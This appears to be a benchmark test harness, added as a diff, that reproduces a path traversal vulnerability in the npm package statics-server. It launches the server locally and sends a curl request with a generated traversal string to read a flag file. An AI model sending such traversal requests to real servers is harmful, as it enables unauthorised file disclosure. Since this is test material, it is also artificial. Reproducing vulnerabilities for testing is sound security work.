@@ -1,0 +1,33 @@
+function exploitFunction(payload) {
+  const { genstr } = payload;
+
+  afterAll(() => {
+    try {
+      execSync("fuser -k 8080/tcp");
+    } catch (e) {}
+  });
+
+  const path = require("path");  // Import the path module
+  const { sleep } = require("sleep");
+
+  const fs = require("fs");  // Import the fs module to read the file
+
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+  test("Path Traversal in statics-server", (done) => {
+    expect.assertions(1);
+
+    let server = "node ./node_modules/statics-server/index.js";
+    server_process = exec(server, (error, stdout) => {});
+
+    sleep.sleep(2);
+
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr(50)}"`;
+    exec(attack_string, (error, stdout) => {
+      expect(stdout).toBe(fs.readFileSync(pathToFlag).toString());
+      done();
+    });
+  });
+}
+
+module.exports = { exploitFunction };
